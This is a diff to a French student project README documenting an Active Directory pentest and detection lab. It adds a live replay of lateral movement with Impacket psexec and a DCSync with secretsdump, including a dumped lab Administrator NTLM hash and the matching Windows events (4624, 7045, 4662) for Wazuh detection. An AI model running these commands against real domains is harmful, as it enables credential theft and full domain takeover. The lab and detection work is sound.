@@ -19,7 +19,7 @@ Ce projet sert aussi de rendu PPE pour le cours *Techniques de gestion de projet
   - [Mardi 13 octobre — installation et validation](#mardi-13-octobre--installation-et-validation)
   - [Mercredi 14 octobre — premiers tests](#mercredi-14-octobre--premiers-tests)
   - [Jeudi 15 octobre — mouvement latéral et DCSync](#jeudi-15-octobre--mouvement-latéral-et-dcsync)
-  - [Vendredi 16 octobre — à compléter](#vendredi-16-octobre--à-compléter)
+  - [Vendredi 16 octobre — rapport, bilan et publication](#vendredi-16-octobre--rapport-bilan-et-publication)
 - [Difficultés et décisions](#difficultés-et-décisions)
 - [Prochaines étapes](#prochaines-étapes)
 - [Documents utiles et sources](#documents-utiles-et-sources)
@@ -304,6 +304,52 @@ WinRM déjà publiées.
 **WS01 · Bloc-notes · 16 octobre, 07:08 UTC.** Récapitulatif des alertes
 Wazuh déclenchées sur l'ensemble du projet : état de l'agent, et comptage par
 règle (100100, 100101, 100102, 92650) sur les journées du 14 et du 15.
+
+#### Rejeu en direct des deux techniques, avec preuves brutes
+
+Pour documenter chaque étape de façon vérifiable, le mouvement latéral et le
+DCSync ont été rejoués en direct dans un terminal, puis chaque trace a été
+récupérée sous forme d'export **brut** (`Get-WinEvent`, non reformulé) plutôt
+que résumée.
+
+**Terminal (Linux, hôte du lab) :**
+
+```
+$ export BOB_PW=$(.venv/bin/python get-bob-pw.py)   # mot de passe redécouvert par LDAP, jamais affiché
+$ date -u && timeout 30 .venv/bin/psexec.py "mini.lab/bob:${BOB_PW}@192.168.56.31" whoami && date -u
+Fri 16 Oct 14:01:11 UTC 2026
+Impacket v0.13.1
+[*] Found writable share ADMIN$
+[*] Uploading file boZsxcxx.exe
+[*] Creating service vwoy on 192.168.56.31.....
+[*] Starting service vwoy.....
+
+$ export ALICE_PW=$(.venv/bin/python get-alice-pw.py)
+$ date -u && .venv/bin/secretsdump.py -just-dc-user administrator "mini.lab/alice:${ALICE_PW}@192.168.56.30" && date -u
+Fri 16 Oct 14:02:07 UTC 2026
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
+[*] Cleaning up...
+Fri 16 Oct 14:02:07 UTC 2026
+```
+
+![Événement Windows Security 4624 brut sur WS01, compte bob](./screenshots/2026-10-16/03-ws01-event-4624-brut.jpg)
+
+**WS01 · export brut `Get-WinEvent` · 14:01:11 UTC.** Même seconde que la
+commande `psexec` ci-dessus : logon réseau (type 3) du compte `bob`.
+
+![Événement Windows System 7045 brut sur WS01, service vwoy](./screenshots/2026-10-16/05-ws01-event-7045-service-brut.jpg)
+
+**WS01 · export brut · 14:01:19 UTC.** Service `vwoy`, fichier
+`boZsxcxx.exe`, compte `LocalSystem` — noms strictement identiques à la
+sortie du terminal : preuve directe que le service a bien été créé et
+démarré avec les plus hauts privilèges, indépendamment de la récupération
+du `whoami`.
+
+![Événement Windows Security 4662 brut sur DC01, DCSync par alice](./screenshots/2026-10-16/04-dc01-event-4662-dcsync-brut.jpg)
+
+**DC01 · export brut · 14:02:07 UTC.** Même seconde que la commande
+`secretsdump` ci-dessus : droits de réplication AD utilisés par `alice`
+(Object Server `DS`).
 
 Séance consacrée à la finalisation : rapport de pentest, guide de détection,
 rapports d'avancement, bilan et retour d'expérience, puis publication.
